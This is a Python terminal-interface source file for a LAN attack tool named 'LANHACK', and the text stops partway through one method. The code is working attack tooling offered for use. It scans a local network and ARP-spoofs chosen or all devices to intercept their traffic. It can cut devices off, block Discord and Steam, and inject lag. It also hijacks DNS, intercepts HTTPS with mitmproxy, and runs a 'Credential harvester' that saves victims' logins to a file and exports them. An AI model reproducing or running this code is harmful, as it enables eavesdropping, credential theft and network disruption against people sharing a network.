import os, sys, re, subprocess, shutil, socket, struct, threading, time
import csv, json, webbrowser
from datetime import datetime

import scapy.all as scapy
from textual.app import App, ComposeResult
from textual.containers import Horizontal, ScrollableContainer
from textual.widgets import Button, Static, DataTable, TabbedContent, TabPane, Input, RichLog
from textual.binding import Binding

from lanhack import config as C
from lanhack.network import arp_scan, arp_spoof_loop, fingerprint_device, wake_on_lan, device_label, main_site, detect_network
from lanhack.monitor import sniff_sites
from lanhack.dns import _dns_server_run
from lanhack.harvester import harvester_proxy, _ensure_mitm_addon, _init_cred_file, HARVEST_JS


class NetcutApp(App):
    CSS = """
    Screen { background: #1a1b26; }
    #header { background: #24283b; color: #a9b1d6; padding: 1; text-align: center; }
    #header Label { width: 100%; }
    #footer-bar { background: #24283b; color: #565f89; height: 1; }
    Button { margin: 0 1; min-width: 12; }
    Button:hover { text-style: bold; }
    Button.primary { background: #2ac3de; color: #1a1b26; }
    Button.error { background: #f7768e; color: #1a1b26; }
    Button.success { background: #9ece6a; color: #1a1b26; }
    Button.warning { background: #e0af68; color: #1a1b26; }
    Input.subnet { width: 28; }
    Input.target { width: 28; }
    Input.iface { width: 18; }
    #mid-row { height: 3; margin-bottom: 1; }
    #top-row { height: 3; margin-bottom: 1; }
    #dev-table { margin-top: 1; }
    Button { min-width: 8; }
    #dev-toolbar { height: 3; }
    #action-bar { height: 3; }
    #toolbar { background: #1f2335; padding: 1 1; height: 5; }
    #toolbar Button { margin: 0 1; }
    #content { height: 1fr; }
    #stats { background: #24283b; color: #565f89; height: 1; padding: 0 2; }
    DataTable { height: 1fr; }
    DataTable > .datatable--header { background: #2f354a; color: #a9b1d6; }
    DataTable > .datatable--highlight { background: #2f354a; }
    RichLog { height: 1fr; background: #1f2335; }
    #attack-buttons { padding: 1 2; height: auto; }
    TabbedContent { height: 1fr; }
    TabPane { padding: 1; }
    #site-list { height: 1fr; }
    Label.status-active { color: #9ece6a; }
    Label.status-blocked { color: #f7768e; }
    Label.status-inactive { color: #565f89; }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("r", "refresh", "Refresh"),
    ]

    def compose(self) -> ComposeResult:
        yield Static(f"  LANHACK  |  {C.iface}  |  {C.my_ip}  |  GW: {C.gateway_ip}  |  {C.netmask}", id="header")
        yield Static("", id="stats")
        with ScrollableContainer(id="content"):
            with TabbedContent(initial="monitor"):
                with TabPane("Monitor", id="monitor"):
                    pass
                with TabPane("Devices", id="devices"):
                    pass
                with TabPane("Attacks", id="attacks"):
                    yield Static("Loading...", id="attacks-loading")
                with TabPane("Sites", id="sites"):
                    pass
        yield Static("", id="footer-bar")

    def on_mount(self) -> None:
        detect_network()
        self.query_one(TabbedContent).focus()
        self.build_device_tab()
        self.build_monitor_tab()
        self.build_sites_tab()
        self._build_attacks_all()
        C.load_state()
        self.update_stats()
        self.set_interval(2, self.refresh_monitor)
        if not C.iface or C.iface == "unknown":
            try:
                C.iface = scapy.conf.iface
                C.my_ip = scapy.get_if_addr(C.iface)
                octets = C.my_ip.split(".")
                if len(octets) == 4:
                    C.netmask = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
            except: pass
        if not C.iface or C.iface == "unknown":
            self.notify(f"No interface detected!", severity="error", timeout=10)
        else:
            scapy.conf.iface = C.iface
            C.sniff_thread = threading.Thread(target=sniff_sites, daemon=True)
            C.sniff_thread.start()
            self.notify(f"Sniffing on {C.iface} ({C.my_ip})", timeout=3)

    def update_stats(self):
        try:
            hdr = self.query_one("#header", Static)
            hdr.update(f"  LANHACK  |  {C.iface}  |  {C.my_ip}  |  GW: {C.gateway_ip}  |  {C.netmask}")
        except: pass
        status = f" {C.status_message}  |" if C.status_message else ""
        s = f"{status} Devices: {len(C.devices)}  |  Blocked: {len(C.blocked_ips)}  |  Spies: {len(C.spy_threads)}  |  DNS Spoofs: {C.dns_spoof_count}  |  Captures: {sum(len(v) for v in C.captured_sites.values())}  |  Discord: {'ON' if C.quick_discord else 'OFF'}  |  Steam: {'ON' if C.quick_steam else 'OFF'}  |  Lag: {'ON' if C.quick_latency_ip else 'OFF'}"
        self.query_one("#stats").update(s)
        try:
            spy_text = f"\n[bold]Active spies:[/] {', '.join(C.spy_threads.keys())}" if C.spy_threads else ""
            self.query_one("#spy-list", Static).update(spy_text)
        except: pass

    def build_device_tab(self):
        pane = self.query_one("#devices")
        pane.remove_children()
        top = Horizontal(
            Input(placeholder=f"Iface ({C.iface})", id="iface-input", classes="iface"),
            Button("Set", id="set-iface-btn", variant="default"),
            Input(placeholder=f"Subnet ({C.netmask or 'e.g. 192.168.68.0/24'})", id="subnet-input", classes="subnet"),
            Button("Scan", id="scan-btn", variant="primary"),
            Input(placeholder="Target IP", id="target-ip-dev", classes="target"),
            id="top-row"
        )
        pane.mount(top)
        mid = Horizontal(
            Button("Block", id="block-dev-btn", variant="error"),
            Button("Unblock", id="unblock-dev-btn", variant="warning"),
            Button("Spy", id="spy-dev-btn", variant="primary"),
            Button("All", id="spy-all-btn", variant="primary"),
            Button("Load", id="load-ip-btn", variant="default"),
            Button("WoL", id="wol-btn", variant="default"),
            Button("Auto Scan OFF", id="auto-scan-btn", variant="default") if not C.auto_scan_active else Button("Auto Scan ON", id="auto-scan-btn", variant="warning"),
            Button("FP", id="fp-btn", variant="default"),
            Button("MAC", id="toggle-mac-btn", variant="default"),
            Button("Unblock All", id="unblock-all-btn", variant="warning"),
            id="mid-row"
        )
        pane.mount(mid)
        dt = DataTable(id="dev-table")
        if C.show_mac:
            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Fingerprint", "Status")
        else:
            dt.add_columns("#", "IP", "Vendor", "Hostname", "Fingerprint", "Status")
        pane.mount(dt)
        pane.mount(Static("", id="spy-list"))

    def refresh_devices(self):
        if not C.devices: return
        try:
            dt = self.query_one("#dev-table", DataTable)
            dt.clear()
            for i, d in enumerate(C.devices, 1):
                blocked = d["ip"] in C.blocked_ips
                status = "[red]BLOCKED[/]" if blocked else "[green]Active[/]"
                fp = d.get("fingerprint", "") or ""
                if C.show_mac:
                    dt.add_row(str(i), d["ip"], d["mac"], d["vendor"], d["hostname"] or "-", fp, status)
                else:
                    dt.add_row(str(i), d["ip"], d["vendor"], d["hostname"] or "-", fp, status)
        except:
            self._rebuild_table()

    def _rebuild_table(self):
        try:
            pane = self.query_one("#devices")
        except: return
        dt = DataTable(id="dev-table")
        if C.show_mac:
            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Fingerprint", "Status")
        else:
            dt.add_columns("#", "IP", "Vendor", "Hostname", "Fingerprint", "Status")
        for i, d in enumerate(C.devices, 1):
            blocked = d["ip"] in C.blocked_ips
            status = "[red]BLOCKED[/]" if blocked else "[green]Active[/]"
            fp = d.get("fingerprint", "") or ""
            if C.show_mac:
                dt.add_row(str(i), d["ip"], d["mac"], d["vendor"], d["hostname"] or "-", fp, status)
            else:
                dt.add_row(str(i), d["ip"], d["vendor"], d["hostname"] or "-", fp, status)
        pane.mount(dt)

    def on_button_pressed(self, event: Button.Pressed):
        btn_id = event.button.id or ""
        if btn_id == "scan-btn": self.scan_lan()
        elif btn_id == "set-iface-btn":
            val = self.query_one("#iface-input", Input).value.strip()
            if val:
                C.iface = val
                scapy.conf.iface = C.iface
                self.notify(f"Interface set to {C.iface}", timeout=2)
                self.update_stats()
        elif btn_id == "spy-all-btn":
            if not C.devices:
                self.notify("Scan LAN first", severity="warning", timeout=2)
            else:
                C.log(f"Spy All: starting on {len(C.devices)} devices")
                subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
                C.iptables.policy("FORWARD", "ACCEPT")
                count = 0
                for d in C.devices:
                    ip = d["ip"]
                    if ip in C.spy_threads: continue
                    mac = d["mac"]
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,C.gateway_ip,ev,False),daemon=True)
                    t.start(); C.spy_threads[ip] = (t, ev)
                    count += 1
                C.log(f"Spy All: spoofing {count} devices via gateway {C.gateway_ip}")
                self.notify(f"Spying on all {count} devices", timeout=3)
                self.update_stats()
        elif btn_id == "list-view-btn":
            C.show_graphs = False
            self.query_one("#list-view-btn", Button).variant = "primary"
            self.query_one("#graph-view-btn", Button).variant = "default"
        elif btn_id == "graph-view-btn":
            C.show_graphs = True
            self.query_one("#list-view-btn", Button).variant = "default"
            self.query_one("#graph-view-btn", Button).variant = "primary"
        elif btn_id == "auto-scan-btn":
            if C.auto_scan_active:
                C.auto_scan_active = False
                if C.auto_scan_timer: C.auto_scan_timer.stop()
                try: self.query_one("#auto-scan-btn", Button).label = "Auto Scan"
                except: pass
                self.notify("Auto-scan stopped", timeout=2)
            else:
                C.auto_scan_active = True
                self.do_auto_scan()
                C.auto_scan_timer = self.set_interval(30, self.do_auto_scan)
                try: self.query_one("#auto-scan-btn", Button).label = "Auto Scan ON"
                except: pass
                self.notify("Auto-scan every 30s", timeout=3)
        elif btn_id == "fp-btn":
            if not C.devices:
                self.notify("Scan LAN first", severity="warning", timeout=2)
            else:
                C.status_message = f"Fingerprinting {len(C.devices)} devices..."
                self.notify(C.status_message, timeout=10)
                t = threading.Thread(target=self._do_fingerprint, daemon=True)
                t.start()

        elif btn_id == "wol-btn":
            ip = self.query_one("#target-ip-dev", Input).value.strip()
            mac = next((d["mac"] for d in C.devices if d["ip"] == ip), None)
            if mac and wake_on_lan(mac):
                self.notify(f"WoL sent to {ip} ({mac})", timeout=3)
            elif mac:
                self.notify(f"WoL failed for {mac}", severity="error", timeout=3)
            else:
                self.notify("No device found at that IP", severity="warning", timeout=3)
        elif btn_id == "load-ip-btn":
            try:
                dt = self.query_one("#dev-table", DataTable)
                idx = dt.cursor_row
                if idx is not None and 0 <= idx < len(C.devices):
                    ip = C.devices[idx]["ip"]
                    self.query_one("#target-ip-dev", Input).value = ip
                    self.query_one("#target-ip", Input).value = ip
                    self.notify(f"Loaded IP: {ip}", timeout=1)
            except: pass
        elif btn_id == "toggle-mac-btn":
            C.show_mac = not C.show_mac
            self.refresh_devices()
            self.notify(f"MAC {'hidden' if not C.show_mac else 'shown'}", timeout=1)
            self.update_stats()
        elif btn_id == "unblock-all-btn": self.unblock_all()
        elif btn_id == "discord-btn": self.toggle_discord()
        elif btn_id == "steam-btn": self.toggle_steam()
        elif btn_id == "lag-btn": self.do_latency()
        elif btn_id == "clear-btn": self.clear_attacks()
        elif btn_id == "block-domain-btn":
            domain = self.query_one("#domain-input", Input).value.strip()
            if domain: self.block_domain(domain)
        elif btn_id == "unblock-domain-btn":
            domain = self.query_one("#domain-input", Input).value.strip()
            if domain: self.unblock_domain(domain)
        elif btn_id == "global-dns-btn":
            self.toggle_global_dns()
        elif btn_id == "export-btn":
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            csv_path = f"lanhack_export_{ts}.csv"
            json_path = f"lanhack_export_{ts}.json"
            rows = []
            for ip in C.captured_sites:
                for ts2, site, stype, src, dst in C.captured_sites[ip]:
                    rows.append({"Time":ts2,"Device":device_label(ip),"IP":ip,"Type":stype,"Site":site})
            with open(csv_path, "w", newline="") as f:
                if rows:
                    w = csv.DictWriter(f, fieldnames=rows[0].keys())
                    w.writeheader()
                    w.writerows(rows)
            with open(json_path, "w") as f:
                json.dump({"captures":rows,"total":len(rows),"harvested_http":C.harvested_creds}, f, indent=2)
            self.notify(f"Exported {len(rows)} entries to {csv_path} and {json_path}", timeout=5)
        elif btn_id == "view-creds-btn":
            creds = []
            if os.path.exists("/tmp/lanhack_creds.txt"):
                with open("/tmp/lanhack_creds.txt") as f:
                    creds = f.read().strip().split("\\n")
            http_creds = C.harvested_creds[-10:]
            msg = "HTTPS captured:\\n" + "\\n".join(creds[-10:]) if creds else "HTTPS: none captured"
            msg += "\\n\\nHTTP captured:\\n" + "\\n".join(f"[{t}] {c}" for _,c,t in http_creds) if http_creds else "\\nHTTP: none"
            self.notify(msg[:500], timeout=10)
        elif btn_id == "harvest-btn":
            if C.harvester_on:
                C.harvester_on = False
                if C.harvester_thread:
                    C.harvester_thread.join(timeout=3)
                    C.harvester_thread = None
                C.iptables.delete("PREROUTING", ["-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8082"], table="nat")
                self.notify("Harvester stopped", timeout=2)
            else:
                C.harvester_on = True
                C.harvester_thread = threading.Thread(target=harvester_proxy, daemon=True)
                C.harvester_thread.start()
                C.iptables.insert("PREROUTING", ["-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8082"], table="nat")
                self.notify("Credential harvester active (HTTP only)", severity="warning", timeout=4)
            self.update_stats()
            self.build_attacks_tab()
        elif btn_id == "https-btn":
            if C.https_intercept_on:
                self._stop_https_intercept()
            else:
                self._start_https_intercept()
        elif btn_id == "stealth-btn":
            C.stealth_mode = not C.stealth_mode
            self.notify(f"Stealth mode {'ON' if C.stealth_mode else 'OFF'}", timeout=2)
            self.build_attacks_tab()
        elif btn_id == "block-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            mac = next((d["mac"] for d in C.devices if d["ip"]==ip), None)
            if ip and mac: self.block_device(ip); self.refresh_devices()
            elif ip: self.notify(f"Device {ip} not found. Scan LAN first.", timeout=3)
        elif btn_id == "unblock-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            if ip: self.unblock_device(ip); self.refresh_devices()
        elif btn_id == "block-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            mac = next((d["mac"] for d in C.devices if d["ip"]==ip), None)
            if ip and mac: self.block_device(ip); self.refresh_devices()
            elif ip: self.notify(f"Device {ip} not found. Scan LAN first.", timeout=3)
        elif btn_id == "unblock-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            if ip: self.unblock_device(ip); self.refresh_devices()
        elif btn_id == "spy-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            if ip and ip in C.spy_threads:
                _, ev = C.spy_threads[ip]; ev.clear(); del C.spy_threads[ip]
                self.notify(f"Stopped spying on {ip}", timeout=2)
            elif ip:
                mac = next((d["mac"] for d in C.devices if d["ip"]==ip), None)
                if mac:
                    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
                    C.iptables.policy("FORWARD", "ACCEPT")
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,C.gateway_ip,ev,False),daemon=True)
                    t.start(); C.spy_threads[ip] = (t, ev)
                    self.notify(f"Spying on {ip}", timeout=2)
        elif btn_id == "spy-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            if ip and ip in C.spy_threads:
                _, ev = C.spy_threads[ip]; ev.clear(); del C.spy_threads[ip]
                self.notify(f"Stopped spying on {ip}", timeout=2)
            elif ip:
                mac = next((d["mac"] for d in C.devices if d["ip"]==ip), None)
                if mac:
                    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
                    C.iptables.policy("FORWARD", "ACCEPT")
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,C.gateway_ip,ev,False),daemon=True)
                    t.start(); C.spy_threads[ip] = (t, ev)
                    self.notify(f"Spying on {ip}", timeout=2)
        self.update_stats()

    def on_data_table_row_selected(self, event: DataTable.RowSelected):
        if event.data_table.id == "dev-table":
            try:
                idx = event.data_table.cursor_row
                if idx is not None and 0 <= idx < len(C.devices):
                    ip = C.devices[idx]["ip"]
                    self.query_one("#target-ip-dev", Input).value = ip
                    self.query_one("#target-ip", Input).value = ip
            except: pass
        elif event.data_table.id == "site-table":
            try:
                idx = int(event.row_key.value)
                seen = set()
                st = []
                for ip in sorted(C.captured_sites.keys()):
                    for ts, site, stype, src, dst in C.captured_sites[ip]:
                        k = f"{site}|{src}|{dst}"
                        if k not in seen: seen.add(k); st.append((ts, site, device_label(src)))
                if 0 <= idx < len(st):
                    site = st[idx][1]
                    url = f"https://{main_site(site)}"
                    webbrowser.open(url)
                    self.notify(f"Opened {url}")
            except: pass

    def scan_lan(self):
        inp = self.query_one("#subnet-input", Input).value.strip()
        subnet = inp if inp else C.netmask
        if not subnet:
            self.notify("Enter a subnet (e.g. 192.168.68.0/24)", severity="warning", timeout=3)
            return
        if inp: C.netmask = subnet
        C.status_message = f"Scanning {subnet}..."
        self.notify(C.status_message, timeout=10)
        t = threading.Thread(target=self._do_scan, args=(subnet,), daemon=True)
        t.start()

    def _do_scan(self, subnet):
        try:
            found = arp_scan(subnet)
            self.call_from_thread(self._scan_done, found)
        except Exception as e:
            self.call_from_thread(self._scan_error, str(e))

    def _scan_error(self, msg):
        C.status_message = ""
        self.notify(f"Scan failed: {msg}", severity="error", timeout=3)
        self.update_stats()

    def _scan_done(self, found):
        C.devices = found
        C.status_message = ""
        self.refresh_devices()
        self.update_stats()
        self.notify(f"Found {len(C.devices)} devices", severity="information", timeout=3)

    def _do_fingerprint(self):
        for d in C.devices:
            guess, ports = fingerprint_device(d["ip"])
            d["fingerprint"] = guess
            d["open_ports"] = ",".join(str(p) for p in ports)
        self.call_from_thread(self._fp_done)

    def _fp_done(self):
        C.status_message = ""
        self.refresh_devices()
        self.update_stats()
        self.notify("Fingerprinting complete", timeout=3)

    def do_auto_scan(self):
        def _scan():
            try:
                found = arp_scan(C.netmask)
                existing = {d["ip"] for d in C.devices}
                new_ones = [d for d in found if d["ip"] not in existing]
                if new_ones:
                    C.devices.extend(new_ones)
                    C.devices.sort(key=lambda x: [int(o) for o in x["ip"].split(".")])
                    self.call_from_thread(self._auto_scan_done, new_ones)
            except: pass
        t = threading.Thread(target=_scan, daemon=True)
        t.start()

    def _auto_scan_done(self, new_ones):
        self.refresh_devices()
        self.update_stats()
        names = ", ".join(d["ip"] for d in new_ones)
        self.notify(f"New devices: {names}", timeout=5)

    def toggle_block(self, ip):
        if ip == C.gateway_ip or ip == C.my_ip:
            self.notify("Cannot block gateway or yourself", severity="warning", timeout=2)
            return
        if ip in C.blocked_ips:
            self.unblock_device(ip)
        else:
            self.block_device(ip)
        self.refresh_devices()
        self.update_stats()

    def block_device(self, ip):
        if ip in C.blocked_ips: return
        mac = next((d["mac"] for d in C.devices if d["ip"] == ip), None)
        if not mac: return
        C.blocked_ips.add(ip)
        ev = threading.Event(); ev.set()
        t = threading.Thread(target=arp_spoof_loop, args=(ip,mac,C.gateway_ip,ev), daemon=True)
        t.start()
        C.spoof_threads[ip] = (t, ev)
        C.iptables.insert("FORWARD", ["-m", "mac", "--mac-source", mac, "-j", "DROP"])
        C.iptables.insert("FORWARD", ["-d", ip, "-j", "DROP"])
        C.save_state()
        self.notify(f"Blocked {ip} ({mac})", severity="warning", timeout=2)

    def unblock_device(self, ip):
        mac = next((d["mac"] for d in C.devices if d["ip"] == ip), None)
        if ip in C.spoof_threads:
            _, ev = C.spoof_threads[ip]; ev.clear(); del C.spoof_threads[ip]
        C.blocked_ips.discard(ip)
        try: scapy.send(scapy.ARP(op=2,pdst=ip,psrc=C.gateway_ip), verbose=False)
        except: pass
        C.iptables.delete("FORWARD", ["-d", ip, "-j", "DROP"])
        if mac: C.iptables.delete("FORWARD", ["-m", "mac", "--mac-source", mac, "-j", "DROP"])
        C.save_state()
        self.notify(f"Unblocked {ip}", severity="information", timeout=2)

    def unblock_all(self):
        for ip in list(C.blocked_ips): self.unblock_device(ip)
        self.refresh_devices(); self.update_stats()
        self.notify("All devices unblocked", timeout=2)

    def toggle_discord(self):
        if C.quick_discord:
            for r in C.DISCORD_RANGES:
                C.iptables.delete("FORWARD", ["-d", r, "-j", "DROP"])
            C.quick_discord = False
            self.notify("Discord unblocked", timeout=2)
        else:
            C.iptables.policy("FORWARD", "ACCEPT")
            for r in C.DISCORD_RANGES:
                C.iptables.insert("FORWARD", ["-d", r, "-j", "DROP"])
            C.quick_discord = True
            self.notify("Discord blocked", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()

    def toggle_steam(self):
        if C.quick_steam:
            for r in C.STEAM_RANGES:
                C.iptables.delete("FORWARD", ["-d", r, "-j", "DROP"])
            C.iptables.delete("FORWARD", ["-p", "udp", "--dport", "27000:27100", "-j", "DROP"])
            C.quick_steam = False
            self.notify("Steam unblocked", timeout=2)
        else:
            C.iptables.policy("FORWARD", "ACCEPT")
            for r in C.STEAM_RANGES:
                C.iptables.insert("FORWARD", ["-d", r, "-j", "DROP"])
            C.iptables.insert("FORWARD", ["-p", "udp", "--dport", "27000:27100", "-j", "DROP"])
            C.quick_steam = True
            self.notify("Steam blocked", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()

    def block_domain(self, domain):
        try:
            ips = set()
            for cmd in ["host", "dig +short", "nslookup"]:
                try:
                    out = subprocess.check_output(f"{cmd} {domain}", shell=True, text=True, timeout=5)
                    for ip in re.findall(r'(?:\d{1,3}\.){3}\d{1,3}', out):
                        if ip.startswith("127."): continue
                        ips.add(ip)
                    if ips: break
                except: continue
            if not ips:
                C.log(f"Block domain: could not resolve {domain}")
                self.notify(f"Could not resolve {domain}", severity="error", timeout=5)
                return
            C.iptables.policy("FORWARD", "ACCEPT")
            ip_list = sorted(ips)
            for ip in ip_list:
                C.iptables.insert("FORWARD", ["-d", ip, "-j", "DROP"])
                C.iptables.insert("OUTPUT", ["-d", ip, "-j", "DROP"])
            C.custom_blocks[domain] = ip_list
            C.save_state()
            C.log(f"Block domain: {domain} -> {', '.join(ip_list)}")
            self.notify(f"Blocked {domain}: {', '.join(ip_list)}", severity="warning", timeout=5)
        except Exception as e:
            self.notify(f"Error: {e}", severity="error", timeout=5)
        self.update_stats()
        self.build_attacks_tab()
    
    def unblock_domain(self, domain):
        if domain in C.custom_blocks:
            for ip in C.custom_blocks[domain]:
                C.iptables.delete("FORWARD", ["-d", ip, "-j", "DROP"])
                C.iptables.delete("OUTPUT", ["-d", ip, "-j", "DROP"])
            del C.custom_blocks[domain]
            C.save_state()
            self.notify(f"Unblocked {domain}", timeout=2)
        self.update_stats()
        self.build_attacks_tab()

    def do_latency(self):
        if C.quick_tc_qdisc:
            subprocess.run(["tc", "qdisc", "del", "dev", C.iface, "root"], stderr=subprocess.DEVNULL)
            C.quick_latency_ip = None; C.quick_tc_qdisc = False
            self.notify("Lag removed", timeout=2)
        else:
            if not C.devices:
                self.notify("Scan LAN first", severity="warning", timeout=2)
                return
            ip = C.devices[0]["ip"]
            subprocess.run(["tc", "qdisc", "add", "dev", C.iface, "root", "handle", "1:", "netem", "delay", "500ms", "100ms", "loss", "5%"], stderr=subprocess.DEVNULL)
            C.quick_latency_ip = ip; C.quick_tc_qdisc = True
            self.notify(f"Lag on {ip} (500ms + 5% loss)", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()

    def toggle_global_dns(self):
        if C.global_dns_block:
            C.log("Global DNS: disabling")
            C.global_dns_block = False
            C.dns_stop = True
            if C.dns_server_thread:
                C.dns_server_thread.join(timeout=3)
                C.dns_server_thread = None
            C.dns_stop = False
            C.iptables.delete("PREROUTING", ["-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], table="nat")
            C.iptables.delete("INPUT", ["-p", "udp", "--dport", "53", "-j", "ACCEPT"])
            self.notify("Global DNS block disabled", timeout=2)
            C.log("Global DNS: disabled")
        else:
            try:
                C.log("Global DNS: enabling")
                C.dns_server_thread = threading.Thread(target=_dns_server_run, daemon=True)
                C.dns_server_thread.start()
                time.sleep(0.5)
                if not C.dns_server_thread.is_alive():
                    C.log("Global DNS: server thread died immediately")
                    self.notify("DNS server failed to start (port 53 in use?)", severity="error", timeout=5)
                    return
                C.iptables.insert("INPUT", ["-p", "udp", "--dport", "53", "-j", "ACCEPT"])
                C.iptables.insert("PREROUTING", ["-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], table="nat")
                C.global_dns_block = True
                C.log("Global DNS: enabled, rules added")
                self.notify("Global DNS block ON — all devices blocked", severity="warning", timeout=5)
            except Exception as e:
                C.log(f"Global DNS failed: {e}")
                self.notify(f"Global DNS failed: {e}", severity="error", timeout=5)
        self.update_stats()
        self.build_attacks_tab()

    def _start_https_intercept(self):
        try:
            if not shutil.which("mitmproxy") and not shutil.which("mitmdump"):
                self.notify("Installing mitmproxy...", timeout=5)
                subprocess.check_call(["pip", "install", "mitmproxy", "--user", "-q"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            C.iptables.policy("FORWARD", "ACCEPT")
            ca_dir = os.path.expanduser("~/.mitmproxy")
            os.makedirs(ca_dir, exist_ok=True)
            cert_path = os.path.join(ca_dir, "mitmproxy-ca.pem")
            if not os.path.exists(cert_path):
                gen = subprocess.Popen(["mitmdump", "--listen-port", "8081"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                gen.terminate()
                try: gen.wait(timeout=5)
                except: pass
            _ensure_mitm_addon()
            cred_log = "/tmp/lanhack_creds.txt"
            _init_cred_file(cred_log)
            C.mitm_process = subprocess.Popen(
                ["mitmdump", "--listen-port", "8081", "--set", "flow_detail=0", "-s", C.MITM_ADDON, "-q"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            C.iptables.insert("PREROUTING", ["-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8081"], table="nat")
            C.iptables.insert("PREROUTING", ["-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8081"], table="nat")
            time.sleep(1)
            self.notify(f"HTTPS Intercept ON — CA cert at {cert_path}", severity="warning", timeout=8)
            self.update_stats()
            self.build_attacks_tab()
            C.https_intercept_on = True
        except Exception as e:
            self.notify(f"HTTPS intercept failed: {e}", severity="error", timeout=8)

    def _stop_https_intercept(self):
        C.https_intercept_on = False
        if C.mitm_process:
            try:
                C.mitm_process.terminate()
                C.mitm_process.wait(timeout=5)
            except: pass
            C.mitm_process = None
        C.iptables.delete("PREROUTING", ["-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8081"], table="nat")
        C.iptables.delete("PREROUTING", ["-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8081"], table="nat")
        self.notify("HTTPS Intercept stopped", timeout=3)
        self.update_stats()
        self.build_attacks_tab()

    def clear_attacks(self):
        for domain, ips in list(C.custom_blocks.items()):
            for ip in ips:
                C.iptables.delete("FORWARD", ["-d", ip, "-j", "DROP"])
                C.iptables.delete("OUTPUT", ["-d", ip, "-j", "DROP"])
        C.iptables.restore()
        subprocess.run(["tc", "qdisc", "del", "dev", C.iface, "root"], stderr=subprocess.DEVNULL)
        subprocess.run(["sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
        if C.mitm_process:
            try:
                C.mitm_process.terminate()
                C.mitm_process.wait(timeout=5)
            except: pass
            C.mitm_process = None
        C.quick_discord = False
        C.quick_steam = False
        C.quick_latency_ip = None
        C.quick_tc_qdisc = False
        C.custom_blocks.clear()
        C.global_dns_block = False
        C.https_intercept_on = False
        C.harvester_on = False
        for ip in list(C.spy_threads.keys()):
            _, ev = C.spy_threads[ip]; ev.clear()
        C.spy_threads.clear()
        for ip in list(C.spoof_threads.keys()):
            _, ev = C.spoof_threads[ip]; ev.clear()
        C.spoof_threads.clear()
        C.blocked_ips.clear()
        C.dns_blocklist.clear()
        C.save_state()
        self.notify("All attacks cleared", timeout=2)
        self.update_stats()
        self.build_attacks_tab()

    def _build_attacks_all(self):
        if C._attacks_built: return
        C._attacks_built = True
        C.log("Building attacks tab")
        try:
            pane = self.query_one("#attacks")
            try:
                loading = self.query_one("#attacks-loading", Static)
                if loading: loading.remove()
            except: pass
            pane.mount(Static("[bold yellow] Quick Attacks[/]", id="attacks-title"))
            pane.mount(Horizontal(
                Button("Block Discord", id="discord-btn", variant="primary"),
                Button("Block Steam", id="steam-btn", variant="primary"),
                Button("Add Lag", id="lag-btn", variant="primary"),
                Button("Clear All", id="clear-btn", variant="warning"),
                id="attack-buttons"
            ))
            pane.mount(Static("[bold]Device Actions[/]"))
            pane.mount(Horizontal(
                Input(placeholder="Target IP", id="target-ip"),
                Button("Block", id="block-ip-btn", variant="error"),
                Button("Unblock", id="unblock-ip-btn", variant="warning"),
                Button("Spy", id="spy-ip-btn", variant="primary"),
                id="dev-actions"
            ))
            pane.mount(Static("[bold]Block by Domain[/]"))
            pane.mount(Horizontal(Input(placeholder="Domain (e.g. discord.com)", id="domain-input", classes="domain-input"), id="domain-input-row"))
            pane.mount(Horizontal(
                Button("Block Domain", id="block-domain-btn", variant="error"),
                Button("Unblock Domain", id="unblock-domain-btn", variant="warning"),
                id="domain-btn-row"
            ))
            pane.mount(Static("", id="domain-status"))
            pane.mount(Static("[bold]Global DNS / Stealth / HTTPS / Harvester[/]"))
            pane.mount(Horizontal(
                Button("Toggle Global DNS", id="global-dns-btn", variant="warning"),
                Button("Stealth", id="stealth-btn", variant="default"),
                Button("HTTPS Intercept", id="https-btn", variant="error"),
                Button("Harvester", id="harvest-btn", variant="error"),
                Button("View Creds", id="view-creds-btn", variant="default"),
                id="toggles-row"
            ))
            pane.mount(Static("", id="global-dns-status"))
            pane.mount(Static("", id="harvest-status"))
        except Exception as e:
            self.notify(f"Build: {e}", severity="error", timeout=10)

    def build_attacks_tab(self):
        try:
            self.query_one("#discord-btn", Button).label = "Unblock Discord" if C.quick_discord else "Block Discord"
            self.query_one("#discord-btn", Button).variant = "error" if C.quick_discord else "primary"
            self.query_one("#steam-btn", Button).label = "Unblock Steam" if C.quick_steam else "Block Steam"
            self.query_one("#steam-btn", Button).variant = "error" if C.quick_steam else "primary"
